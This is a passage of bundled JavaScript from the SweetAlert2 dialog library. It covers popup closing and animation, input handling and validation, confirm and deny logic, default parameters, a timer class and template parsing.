            var offset = parseInt(document.body.style.top, 10);
            removeClass(document.body, swalClasses.iosfix);
            document.body.style.top = "";
            document.body.scrollTop = offset * -1;
          }
        };
        var measureScrollbar = function measureScrollbar2() {
          var scrollDiv = document.createElement("div");
          scrollDiv.className = swalClasses["scrollbar-measure"];
          document.body.appendChild(scrollDiv);
          var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
          document.body.removeChild(scrollDiv);
          return scrollbarWidth;
        };
        var previousBodyPadding = null;
        var replaceScrollbarWithPadding = function replaceScrollbarWithPadding2(initialBodyOverflow) {
          if (previousBodyPadding !== null) {
            return;
          }
          if (document.body.scrollHeight > window.innerHeight || initialBodyOverflow === "scroll") {
            previousBodyPadding = parseInt(window.getComputedStyle(document.body).getPropertyValue("padding-right"));
            document.body.style.paddingRight = "".concat(previousBodyPadding + measureScrollbar(), "px");
          }
        };
        var undoReplaceScrollbarWithPadding = function undoReplaceScrollbarWithPadding2() {
          if (previousBodyPadding !== null) {
            document.body.style.paddingRight = "".concat(previousBodyPadding, "px");
            previousBodyPadding = null;
          }
        };
        function removePopupAndResetState(instance, container, returnFocus, didClose) {
          if (isToast()) {
            triggerDidCloseAndDispose(instance, didClose);
          } else {
            restoreActiveElement(returnFocus).then(function() {
              return triggerDidCloseAndDispose(instance, didClose);
            });
            removeKeydownHandler(globalState);
          }
          if (isSafariOrIOS) {
            container.setAttribute("style", "display:none !important");
            container.removeAttribute("class");
            container.innerHTML = "";
          } else {
            container.remove();
          }
          if (isModal()) {
            undoReplaceScrollbarWithPadding();
            undoIOSfix();
            unsetAriaHidden();
          }
          removeBodyClasses();
        }
        function removeBodyClasses() {
          removeClass([document.documentElement, document.body], [swalClasses.shown, swalClasses["height-auto"], swalClasses["no-backdrop"], swalClasses["toast-shown"]]);
        }
        function close(resolveValue) {
          resolveValue = prepareResolveValue(resolveValue);
          var swalPromiseResolve = privateMethods.swalPromiseResolve.get(this);
          var didClose = triggerClosePopup(this);
          if (this.isAwaitingPromise) {
            if (!resolveValue.isDismissed) {
              handleAwaitingPromise(this);
              swalPromiseResolve(resolveValue);
            }
          } else if (didClose) {
            swalPromiseResolve(resolveValue);
          }
        }
        var triggerClosePopup = function triggerClosePopup2(instance) {
          var popup = getPopup();
          if (!popup) {
            return false;
          }
          var innerParams = privateProps.innerParams.get(instance);
          if (!innerParams || hasClass(popup, innerParams.hideClass.popup)) {
            return false;
          }
          removeClass(popup, innerParams.showClass.popup);
          addClass(popup, innerParams.hideClass.popup);
          var backdrop = getContainer();
          removeClass(backdrop, innerParams.showClass.backdrop);
          addClass(backdrop, innerParams.hideClass.backdrop);
          handlePopupAnimation(instance, popup, innerParams);
          return true;
        };
        function rejectPromise(error3) {
          var rejectPromise2 = privateMethods.swalPromiseReject.get(this);
          handleAwaitingPromise(this);
          if (rejectPromise2) {
            rejectPromise2(error3);
          }
        }
        var handleAwaitingPromise = function handleAwaitingPromise2(instance) {
          if (instance.isAwaitingPromise) {
            delete instance.isAwaitingPromise;
            if (!privateProps.innerParams.get(instance)) {
              instance._destroy();
            }
          }
        };
        var prepareResolveValue = function prepareResolveValue2(resolveValue) {
          if (typeof resolveValue === "undefined") {
            return {
              isConfirmed: false,
              isDenied: false,
              isDismissed: true
            };
          }
          return Object.assign({
            isConfirmed: false,
            isDenied: false,
            isDismissed: false
          }, resolveValue);
        };
        var handlePopupAnimation = function handlePopupAnimation2(instance, popup, innerParams) {
          var container = getContainer();
          var animationIsSupported = animationEndEvent && hasCssAnimation(popup);
          if (typeof innerParams.willClose === "function") {
            innerParams.willClose(popup);
          }
          if (animationIsSupported) {
            animatePopup(instance, popup, container, innerParams.returnFocus, innerParams.didClose);
          } else {
            removePopupAndResetState(instance, container, innerParams.returnFocus, innerParams.didClose);
          }
        };
        var animatePopup = function animatePopup2(instance, popup, container, returnFocus, didClose) {
          if (!animationEndEvent) {
            return;
          }
          globalState.swalCloseEventFinishedCallback = removePopupAndResetState.bind(null, instance, container, returnFocus, didClose);
          popup.addEventListener(animationEndEvent, function(e) {
            if (e.target === popup) {
              globalState.swalCloseEventFinishedCallback();
              delete globalState.swalCloseEventFinishedCallback;
            }
          });
        };
        var triggerDidCloseAndDispose = function triggerDidCloseAndDispose2(instance, didClose) {
          setTimeout(function() {
            if (typeof didClose === "function") {
              didClose.bind(instance.params)();
            }
            if (instance._destroy) {
              instance._destroy();
            }
          });
        };
        var showLoading = function showLoading2(buttonToReplace) {
          var popup = getPopup();
          if (!popup) {
            new Swal2();
          }
          popup = getPopup();
          if (!popup) {
            return;
          }
          var loader = getLoader();
          if (isToast()) {
            hide(getIcon());
          } else {
            replaceButton(popup, buttonToReplace);
          }
          show(loader);
          popup.setAttribute("data-loading", "true");
          popup.setAttribute("aria-busy", "true");
          popup.focus();
        };
        var replaceButton = function replaceButton2(popup, buttonToReplace) {
          var actions = getActions();
          var loader = getLoader();
          if (!actions || !loader) {
            return;
          }
          if (!buttonToReplace && isVisible$1(getConfirmButton())) {
            buttonToReplace = getConfirmButton();
          }
          show(actions);
          if (buttonToReplace) {
            hide(buttonToReplace);
            loader.setAttribute("data-button-to-replace", buttonToReplace.className);
            actions.insertBefore(loader, buttonToReplace);
          }
          addClass([popup, actions], swalClasses.loading);
        };
        var handleInputOptionsAndValue = function handleInputOptionsAndValue2(instance, params) {
          if (params.input === "select" || params.input === "radio") {
            handleInputOptions(instance, params);
          } else if (["text", "email", "number", "tel", "textarea"].some(function(i) {
            return i === params.input;
          }) && (hasToPromiseFn(params.inputValue) || isPromise(params.inputValue))) {
            showLoading(getConfirmButton());
            handleInputValue(instance, params);
          }
        };
        var getInputValue = function getInputValue2(instance, innerParams) {
          var input = instance.getInput();
          if (!input) {
            return null;
          }
          switch (innerParams.input) {
            case "checkbox":
              return getCheckboxValue(input);
            case "radio":
              return getRadioValue(input);
            case "file":
              return getFileValue(input);
            default:
              return innerParams.inputAutoTrim ? input.value.trim() : input.value;
          }
        };
        var getCheckboxValue = function getCheckboxValue2(input) {
          return input.checked ? 1 : 0;
        };
        var getRadioValue = function getRadioValue2(input) {
          return input.checked ? input.value : null;
        };
        var getFileValue = function getFileValue2(input) {
          return input.files && input.files.length ? input.getAttribute("multiple") !== null ? input.files : input.files[0] : null;
        };
        var handleInputOptions = function handleInputOptions2(instance, params) {
          var popup = getPopup();
          if (!popup) {
            return;
          }
          var processInputOptions = function processInputOptions2(inputOptions) {
            if (params.input === "select") {
              populateSelectOptions(popup, formatInputOptions(inputOptions), params);
            } else if (params.input === "radio") {
              populateRadioOptions(popup, formatInputOptions(inputOptions), params);
            }
          };
          if (hasToPromiseFn(params.inputOptions) || isPromise(params.inputOptions)) {
            showLoading(getConfirmButton());
            asPromise(params.inputOptions).then(function(inputOptions) {
              instance.hideLoading();
              processInputOptions(inputOptions);
            });
          } else if (_typeof(params.inputOptions) === "object") {
            processInputOptions(params.inputOptions);
          } else {
            error2("Unexpected type of inputOptions! Expected object, Map or Promise, got ".concat(_typeof(params.inputOptions)));
          }
        };
        var handleInputValue = function handleInputValue2(instance, params) {
          var input = instance.getInput();
          if (!input) {
            return;
          }
          hide(input);
          asPromise(params.inputValue).then(function(inputValue) {
            input.value = params.input === "number" ? "".concat(parseFloat(inputValue) || 0) : "".concat(inputValue);
            show(input);
            input.focus();
            instance.hideLoading();
          })["catch"](function(err) {
            error2("Error in inputValue promise: ".concat(err));
            input.value = "";
            show(input);
            input.focus();
            instance.hideLoading();
          });
        };
        function populateSelectOptions(popup, inputOptions, params) {
          var select = getDirectChildByClass(popup, swalClasses.select);
          if (!select) {
            return;
          }
          var renderOption = function renderOption2(parent, optionLabel, optionValue) {
            var option = document.createElement("option");
            option.value = optionValue;
            setInnerHtml(option, optionLabel);
            option.selected = isSelected(optionValue, params.inputValue);
            parent.appendChild(option);
          };
          inputOptions.forEach(function(inputOption) {
            var optionValue = inputOption[0];
            var optionLabel = inputOption[1];
            if (Array.isArray(optionLabel)) {
              var optgroup = document.createElement("optgroup");
              optgroup.label = optionValue;
              optgroup.disabled = false;
              select.appendChild(optgroup);
              optionLabel.forEach(function(o) {
                return renderOption(optgroup, o[1], o[0]);
              });
            } else {
              renderOption(select, optionLabel, optionValue);
            }
          });
          select.focus();
        }
        function populateRadioOptions(popup, inputOptions, params) {
          var radio = getDirectChildByClass(popup, swalClasses.radio);
          if (!radio) {
            return;
          }
          inputOptions.forEach(function(inputOption) {
            var radioValue = inputOption[0];
            var radioLabel = inputOption[1];
            var radioInput = document.createElement("input");
            var radioLabelElement = document.createElement("label");
            radioInput.type = "radio";
            radioInput.name = swalClasses.radio;
            radioInput.value = radioValue;
            if (isSelected(radioValue, params.inputValue)) {
              radioInput.checked = true;
            }
            var label = document.createElement("span");
            setInnerHtml(label, radioLabel);
            label.className = swalClasses.label;
            radioLabelElement.appendChild(radioInput);
            radioLabelElement.appendChild(label);
            radio.appendChild(radioLabelElement);
          });
          var radios = radio.querySelectorAll("input");
          if (radios.length) {
            radios[0].focus();
          }
        }
        var formatInputOptions = function formatInputOptions2(inputOptions) {
          var result = [];
          if (inputOptions instanceof Map) {
            inputOptions.forEach(function(value, key) {
              var valueFormatted = value;
              if (_typeof(valueFormatted) === "object") {
                valueFormatted = formatInputOptions2(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          } else {
            Object.keys(inputOptions).forEach(function(key) {
              var valueFormatted = inputOptions[key];
              if (_typeof(valueFormatted) === "object") {
                valueFormatted = formatInputOptions2(valueFormatted);
              }
              result.push([key, valueFormatted]);
            });
          }
          return result;
        };
        var isSelected = function isSelected2(optionValue, inputValue) {
          return !!inputValue && inputValue.toString() === optionValue.toString();
        };
        var _this = void 0;
        var handleConfirmButtonClick = function handleConfirmButtonClick2(instance) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.input) {
            handleConfirmOrDenyWithInput(instance, "confirm");
          } else {
            confirm2(instance, true);
          }
        };
        var handleDenyButtonClick = function handleDenyButtonClick2(instance) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableButtons();
          if (innerParams.returnInputValueOnDeny) {
            handleConfirmOrDenyWithInput(instance, "deny");
          } else {
            deny(instance, false);
          }
        };
        var handleCancelButtonClick = function handleCancelButtonClick2(instance, dismissWith) {
          instance.disableButtons();
          dismissWith(DismissReason.cancel);
        };
        var handleConfirmOrDenyWithInput = function handleConfirmOrDenyWithInput2(instance, type) {
          var innerParams = privateProps.innerParams.get(instance);
          if (!innerParams.input) {
            error2('The "input" parameter is needed to be set when using returnInputValueOn'.concat(capitalizeFirstLetter(type)));
            return;
          }
          var input = instance.getInput();
          var inputValue = getInputValue(instance, innerParams);
          if (innerParams.inputValidator) {
            handleInputValidator(instance, inputValue, type);
          } else if (input && !input.checkValidity()) {
            instance.enableButtons();
            instance.showValidationMessage(innerParams.validationMessage || input.validationMessage);
          } else if (type === "deny") {
            deny(instance, inputValue);
          } else {
            confirm2(instance, inputValue);
          }
        };
        var handleInputValidator = function handleInputValidator2(instance, inputValue, type) {
          var innerParams = privateProps.innerParams.get(instance);
          instance.disableInput();
          var validationPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.inputValidator(inputValue, innerParams.validationMessage));
          });
          validationPromise.then(function(validationMessage) {
            instance.enableButtons();
            instance.enableInput();
            if (validationMessage) {
              instance.showValidationMessage(validationMessage);
            } else if (type === "deny") {
              deny(instance, inputValue);
            } else {
              confirm2(instance, inputValue);
            }
          });
        };
        var deny = function deny2(instance, value) {
          var innerParams = privateProps.innerParams.get(instance || _this);
          if (innerParams.showLoaderOnDeny) {
            showLoading(getDenyButton());
          }
          if (innerParams.preDeny) {
            instance.isAwaitingPromise = true;
            var preDenyPromise = Promise.resolve().then(function() {
              return asPromise(innerParams.preDeny(value, innerParams.validationMessage));
            });
            preDenyPromise.then(function(preDenyValue) {
              if (preDenyValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                instance.close({
                  isDenied: true,
                  value: typeof preDenyValue === "undefined" ? value : preDenyValue
                });
              }
            })["catch"](function(error3) {
              return rejectWith(instance || _this, error3);
            });
          } else {
            instance.close({
              isDenied: true,
              value
            });
          }
        };
        var succeedWith = function succeedWith2(instance, value) {
          instance.close({
            isConfirmed: true,
            value
          });
        };
        var rejectWith = function rejectWith2(instance, error3) {
          instance.rejectPromise(error3);
        };
        var confirm2 = function confirm3(instance, value) {
          var innerParams = privateProps.innerParams.get(instance || _this);
          if (innerParams.showLoaderOnConfirm) {
            showLoading();
          }
          if (innerParams.preConfirm) {
            instance.resetValidationMessage();
            instance.isAwaitingPromise = true;
            var preConfirmPromise = Promise.resolve().then(function() {
              return asPromise(innerParams.preConfirm(value, innerParams.validationMessage));
            });
            preConfirmPromise.then(function(preConfirmValue) {
              if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
                instance.hideLoading();
                handleAwaitingPromise(instance);
              } else {
                succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
              }
            })["catch"](function(error3) {
              return rejectWith(instance || _this, error3);
            });
          } else {
            succeedWith(instance, value);
          }
        };
        function hideLoading() {
          var innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            return;
          }
          var domCache = privateProps.domCache.get(this);
          hide(domCache.loader);
          if (isToast()) {
            if (innerParams.icon) {
              show(getIcon());
            }
          } else {
            showRelatedButton(domCache);
          }
          removeClass([domCache.popup, domCache.actions], swalClasses.loading);
          domCache.popup.removeAttribute("aria-busy");
          domCache.popup.removeAttribute("data-loading");
          domCache.confirmButton.disabled = false;
          domCache.denyButton.disabled = false;
          domCache.cancelButton.disabled = false;
        }
        var showRelatedButton = function showRelatedButton2(domCache) {
          var buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
          if (buttonToReplace.length) {
            show(buttonToReplace[0], "inline-block");
          } else if (allButtonsAreHidden()) {
            hide(domCache.actions);
          }
        };
        function getInput() {
          var innerParams = privateProps.innerParams.get(this);
          var domCache = privateProps.domCache.get(this);
          if (!domCache) {
            return null;
          }
          return getInput$1(domCache.popup, innerParams.input);
        }
        function setButtonsDisabled(instance, buttons, disabled) {
          var domCache = privateProps.domCache.get(instance);
          buttons.forEach(function(button) {
            domCache[button].disabled = disabled;
          });
        }
        function setInputDisabled(input, disabled) {
          var popup = getPopup();
          if (!popup || !input) {
            return;
          }
          if (input.type === "radio") {
            var radios = popup.querySelectorAll('[name="'.concat(swalClasses.radio, '"]'));
            for (var i = 0; i < radios.length; i++) {
              radios[i].disabled = disabled;
            }
          } else {
            input.disabled = disabled;
          }
        }
        function enableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
        }
        function disableButtons() {
          setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
        }
        function enableInput() {
          setInputDisabled(this.getInput(), false);
        }
        function disableInput() {
          setInputDisabled(this.getInput(), true);
        }
        function showValidationMessage(error3) {
          var domCache = privateProps.domCache.get(this);
          var params = privateProps.innerParams.get(this);
          setInnerHtml(domCache.validationMessage, error3);
          domCache.validationMessage.className = swalClasses["validation-message"];
          if (params.customClass && params.customClass.validationMessage) {
            addClass(domCache.validationMessage, params.customClass.validationMessage);
          }
          show(domCache.validationMessage);
          var input = this.getInput();
          if (input) {
            input.setAttribute("aria-invalid", "true");
            input.setAttribute("aria-describedby", swalClasses["validation-message"]);
            focusInput(input);
            addClass(input, swalClasses.inputerror);
          }
        }
        function resetValidationMessage() {
          var domCache = privateProps.domCache.get(this);
          if (domCache.validationMessage) {
            hide(domCache.validationMessage);
          }
          var input = this.getInput();
          if (input) {
            input.removeAttribute("aria-invalid");
            input.removeAttribute("aria-describedby");
            removeClass(input, swalClasses.inputerror);
          }
        }
        var defaultParams = {
          title: "",
          titleText: "",
          text: "",
          html: "",
          footer: "",
          icon: void 0,
          iconColor: void 0,
          iconHtml: void 0,
          template: void 0,
          toast: false,
          animation: true,
          showClass: {
            popup: "swal2-show",
            backdrop: "swal2-backdrop-show",
            icon: "swal2-icon-show"
          },
          hideClass: {
            popup: "swal2-hide",
            backdrop: "swal2-backdrop-hide",
            icon: "swal2-icon-hide"
          },
          customClass: {},
          target: "body",
          color: void 0,
          backdrop: true,
          heightAuto: true,
          allowOutsideClick: true,
          allowEscapeKey: true,
          allowEnterKey: true,
          stopKeydownPropagation: true,
          keydownListenerCapture: false,
          showConfirmButton: true,
          showDenyButton: false,
          showCancelButton: false,
          preConfirm: void 0,
          preDeny: void 0,
          confirmButtonText: "OK",
          confirmButtonAriaLabel: "",
          confirmButtonColor: void 0,
          denyButtonText: "No",
          denyButtonAriaLabel: "",
          denyButtonColor: void 0,
          cancelButtonText: "Cancel",
          cancelButtonAriaLabel: "",
          cancelButtonColor: void 0,
          buttonsStyling: true,
          reverseButtons: false,
          focusConfirm: true,
          focusDeny: false,
          focusCancel: false,
          returnFocus: true,
          showCloseButton: false,
          closeButtonHtml: "&times;",
          closeButtonAriaLabel: "Close this dialog",
          loaderHtml: "",
          showLoaderOnConfirm: false,
          showLoaderOnDeny: false,
          imageUrl: void 0,
          imageWidth: void 0,
          imageHeight: void 0,
          imageAlt: "",
          timer: void 0,
          timerProgressBar: false,
          width: void 0,
          padding: void 0,
          background: void 0,
          input: void 0,
          inputPlaceholder: "",
          inputLabel: "",
          inputValue: "",
          inputOptions: {},
          inputAutoFocus: true,
          inputAutoTrim: true,
          inputAttributes: {},
          inputValidator: void 0,
          returnInputValueOnDeny: false,
          validationMessage: void 0,
          grow: false,
          position: "center",
          progressSteps: [],
          currentProgressStep: void 0,
          progressStepsDistance: void 0,
          willOpen: void 0,
          didOpen: void 0,
          didRender: void 0,
          willClose: void 0,
          didClose: void 0,
          didDestroy: void 0,
          scrollbarPadding: true
        };
        var updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
        var deprecatedParams = {};
        var toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
        var isValidParameter = function isValidParameter2(paramName) {
          return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
        };
        var isUpdatableParameter = function isUpdatableParameter2(paramName) {
          return updatableParams.indexOf(paramName) !== -1;
        };
        var isDeprecatedParameter = function isDeprecatedParameter2(paramName) {
          return deprecatedParams[paramName];
        };
        var checkIfParamIsValid = function checkIfParamIsValid2(param) {
          if (!isValidParameter(param)) {
            warn('Unknown parameter "'.concat(param, '"'));
          }
        };
        var checkIfToastParamIsValid = function checkIfToastParamIsValid2(param) {
          if (toastIncompatibleParams.includes(param)) {
            warn('The parameter "'.concat(param, '" is incompatible with toasts'));
          }
        };
        var checkIfParamIsDeprecated = function checkIfParamIsDeprecated2(param) {
          var isDeprecated = isDeprecatedParameter(param);
          if (isDeprecated) {
            warnAboutDeprecation(param, isDeprecated);
          }
        };
        var showWarningsForParams = function showWarningsForParams2(params) {
          if (params.backdrop === false && params.allowOutsideClick) {
            warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
          }
          for (var param in params) {
            checkIfParamIsValid(param);
            if (params.toast) {
              checkIfToastParamIsValid(param);
            }
            checkIfParamIsDeprecated(param);
          }
        };
        function update(params) {
          var popup = getPopup();
          var innerParams = privateProps.innerParams.get(this);
          if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
            warn("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
            return;
          }
          var validUpdatableParams = filterValidParams(params);
          var updatedParams = Object.assign({}, innerParams, validUpdatableParams);
          render(this, updatedParams);
          privateProps.innerParams.set(this, updatedParams);
          Object.defineProperties(this, {
            params: {
              value: Object.assign({}, this.params, params),
              writable: false,
              enumerable: true
            }
          });
        }
        var filterValidParams = function filterValidParams2(params) {
          var validUpdatableParams = {};
          Object.keys(params).forEach(function(param) {
            if (isUpdatableParameter(param)) {
              validUpdatableParams[param] = params[param];
            } else {
              warn("Invalid parameter to update: ".concat(param));
            }
          });
          return validUpdatableParams;
        };
        function _destroy() {
          var domCache = privateProps.domCache.get(this);
          var innerParams = privateProps.innerParams.get(this);
          if (!innerParams) {
            disposeWeakMaps(this);
            return;
          }
          if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
            globalState.swalCloseEventFinishedCallback();
            delete globalState.swalCloseEventFinishedCallback;
          }
          if (typeof innerParams.didDestroy === "function") {
            innerParams.didDestroy();
          }
          disposeSwal(this);
        }
        var disposeSwal = function disposeSwal2(instance) {
          disposeWeakMaps(instance);
          delete instance.params;
          delete globalState.keydownHandler;
          delete globalState.keydownTarget;
          delete globalState.currentInstance;
        };
        var disposeWeakMaps = function disposeWeakMaps2(instance) {
          if (instance.isAwaitingPromise) {
            unsetWeakMaps(privateProps, instance);
            instance.isAwaitingPromise = true;
          } else {
            unsetWeakMaps(privateMethods, instance);
            unsetWeakMaps(privateProps, instance);
            delete instance.isAwaitingPromise;
            delete instance.disableButtons;
            delete instance.enableButtons;
            delete instance.getInput;
            delete instance.disableInput;
            delete instance.enableInput;
            delete instance.hideLoading;
            delete instance.disableLoading;
            delete instance.showValidationMessage;
            delete instance.resetValidationMessage;
            delete instance.close;
            delete instance.closePopup;
            delete instance.closeModal;
            delete instance.closeToast;
            delete instance.rejectPromise;
            delete instance.update;
            delete instance._destroy;
          }
        };
        var unsetWeakMaps = function unsetWeakMaps2(obj, instance) {
          for (var i in obj) {
            obj[i]["delete"](instance);
          }
        };
        var instanceMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          _destroy,
          close,
          closeModal: close,
          closePopup: close,
          closeToast: close,
          disableButtons,
          disableInput,
          disableLoading: hideLoading,
          enableButtons,
          enableInput,
          getInput,
          handleAwaitingPromise,
          hideLoading,
          rejectPromise,
          resetValidationMessage,
          showValidationMessage,
          update
        });
        var handlePopupClick = function handlePopupClick2(innerParams, domCache, dismissWith) {
          if (innerParams.toast) {
            handleToastClick(innerParams, domCache, dismissWith);
          } else {
            handleModalMousedown(domCache);
            handleContainerMousedown(domCache);
            handleModalClick(innerParams, domCache, dismissWith);
          }
        };
        var handleToastClick = function handleToastClick2(innerParams, domCache, dismissWith) {
          domCache.popup.onclick = function() {
            if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
              return;
            }
            dismissWith(DismissReason.close);
          };
        };
        var isAnyButtonShown = function isAnyButtonShown2(innerParams) {
          return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
        };
        var ignoreOutsideClick = false;
        var handleModalMousedown = function handleModalMousedown2(domCache) {
          domCache.popup.onmousedown = function() {
            domCache.container.onmouseup = function(e) {
              domCache.container.onmouseup = function() {
              };
              if (e.target === domCache.container) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        var handleContainerMousedown = function handleContainerMousedown2(domCache) {
          domCache.container.onmousedown = function() {
            domCache.popup.onmouseup = function(e) {
              domCache.popup.onmouseup = function() {
              };
              if (e.target === domCache.popup || e.target instanceof HTMLElement && domCache.popup.contains(e.target)) {
                ignoreOutsideClick = true;
              }
            };
          };
        };
        var handleModalClick = function handleModalClick2(innerParams, domCache, dismissWith) {
          domCache.container.onclick = function(e) {
            if (ignoreOutsideClick) {
              ignoreOutsideClick = false;
              return;
            }
            if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
              dismissWith(DismissReason.backdrop);
            }
          };
        };
        var isJqueryElement = function isJqueryElement2(elem) {
          return _typeof(elem) === "object" && elem.jquery;
        };
        var isElement = function isElement2(elem) {
          return elem instanceof Element || isJqueryElement(elem);
        };
        var argsToParams = function argsToParams2(args) {
          var params = {};
          if (_typeof(args[0]) === "object" && !isElement(args[0])) {
            Object.assign(params, args[0]);
          } else {
            ["title", "html", "icon"].forEach(function(name, index) {
              var arg = args[index];
              if (typeof arg === "string" || isElement(arg)) {
                params[name] = arg;
              } else if (arg !== void 0) {
                error2("Unexpected type of ".concat(name, '! Expected "string" or "Element", got ').concat(_typeof(arg)));
              }
            });
          }
          return params;
        };
        function fire() {
          var Swal3 = this;
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          return _construct(Swal3, args);
        }
        function mixin(mixinParams) {
          var MixinSwal = /* @__PURE__ */ function(_this2) {
            _inherits(MixinSwal2, _this2);
            function MixinSwal2() {
              _classCallCheck(this, MixinSwal2);
              return _callSuper(this, MixinSwal2, arguments);
            }
            _createClass(MixinSwal2, [{
              key: "_main",
              value: function _main(params, priorityMixinParams) {
                return _get(_getPrototypeOf(MixinSwal2.prototype), "_main", this).call(this, params, Object.assign({}, mixinParams, priorityMixinParams));
              }
            }]);
            return MixinSwal2;
          }(this);
          return MixinSwal;
        }
        var getTimerLeft = function getTimerLeft2() {
          return globalState.timeout && globalState.timeout.getTimerLeft();
        };
        var stopTimer = function stopTimer2() {
          if (globalState.timeout) {
            stopTimerProgressBar();
            return globalState.timeout.stop();
          }
        };
        var resumeTimer = function resumeTimer2() {
          if (globalState.timeout) {
            var remaining = globalState.timeout.start();
            animateTimerProgressBar(remaining);
            return remaining;
          }
        };
        var toggleTimer = function toggleTimer2() {
          var timer = globalState.timeout;
          return timer && (timer.running ? stopTimer() : resumeTimer());
        };
        var increaseTimer = function increaseTimer2(ms) {
          if (globalState.timeout) {
            var remaining = globalState.timeout.increase(ms);
            animateTimerProgressBar(remaining, true);
            return remaining;
          }
        };
        var isTimerRunning = function isTimerRunning2() {
          return !!(globalState.timeout && globalState.timeout.isRunning());
        };
        var bodyClickListenerAdded = false;
        var clickHandlers = {};
        function bindClickHandler() {
          var attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
          clickHandlers[attr] = this;
          if (!bodyClickListenerAdded) {
            document.body.addEventListener("click", bodyClickListener);
            bodyClickListenerAdded = true;
          }
        }
        var bodyClickListener = function bodyClickListener2(event) {
          for (var el = event.target; el && el !== document; el = el.parentNode) {
            for (var attr in clickHandlers) {
              var template = el.getAttribute(attr);
              if (template) {
                clickHandlers[attr].fire({
                  template
                });
                return;
              }
            }
          }
        };
        var staticMethods = /* @__PURE__ */ Object.freeze({
          __proto__: null,
          argsToParams,
          bindClickHandler,
          clickCancel,
          clickConfirm,
          clickDeny,
          enableLoading: showLoading,
          fire,
          getActions,
          getCancelButton,
          getCloseButton,
          getConfirmButton,
          getContainer,
          getDenyButton,
          getFocusableElements,
          getFooter,
          getHtmlContainer,
          getIcon,
          getIconContent,
          getImage,
          getInputLabel,
          getLoader,
          getPopup,
          getProgressSteps,
          getTimerLeft,
          getTimerProgressBar,
          getTitle,
          getValidationMessage,
          increaseTimer,
          isDeprecatedParameter,
          isLoading,
          isTimerRunning,
          isUpdatableParameter,
          isValidParameter,
          isVisible,
          mixin,
          resumeTimer,
          showLoading,
          stopTimer,
          toggleTimer
        });
        var Timer = /* @__PURE__ */ function() {
          function Timer2(callback, delay) {
            _classCallCheck(this, Timer2);
            this.callback = callback;
            this.remaining = delay;
            this.running = false;
            this.start();
          }
          _createClass(Timer2, [{
            key: "start",
            value: function start2() {
              if (!this.running) {
                this.running = true;
                this.started = /* @__PURE__ */ new Date();
                this.id = setTimeout(this.callback, this.remaining);
              }
              return this.remaining;
            }
            /**
             * @returns {number}
             */
          }, {
            key: "stop",
            value: function stop() {
              if (this.started && this.running) {
                this.running = false;
                clearTimeout(this.id);
                this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
              }
              return this.remaining;
            }
            /**
             * @param {number} n
             * @returns {number}
             */
          }, {
            key: "increase",
            value: function increase(n) {
              var running = this.running;
              if (running) {
                this.stop();
              }
              this.remaining += n;
              if (running) {
                this.start();
              }
              return this.remaining;
            }
            /**
             * @returns {number}
             */
          }, {
            key: "getTimerLeft",
            value: function getTimerLeft2() {
              if (this.running) {
                this.stop();
                this.start();
              }
              return this.remaining;
            }
            /**
             * @returns {boolean}
             */
          }, {
            key: "isRunning",
            value: function isRunning() {
              return this.running;
            }
          }]);
          return Timer2;
        }();
        var swalStringParams = ["swal-title", "swal-html", "swal-footer"];
        var getTemplateParams = function getTemplateParams2(params) {
          var template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
          if (!template) {
            return {};
          }
          var templateContent = template.content;
          showWarningsForElements(templateContent);
          var result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
          return result;
        };
        var getSwalParams = function getSwalParams2(templateContent) {
          var result = {};
          var swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
          swalParams.forEach(function(param) {
            showWarningsForAttributes(param, ["name", "value"]);
            var paramName = param.getAttribute("name");
            var value = param.getAttribute("value");
            if (typeof defaultParams[paramName] === "boolean") {
              result[paramName] = value !== "false";
            } else if (_typeof(defaultParams[paramName]) === "object") {
              result[paramName] = JSON.parse(value);
            } else {
              result[paramName] = value;
            }
          });
          return result;
        };
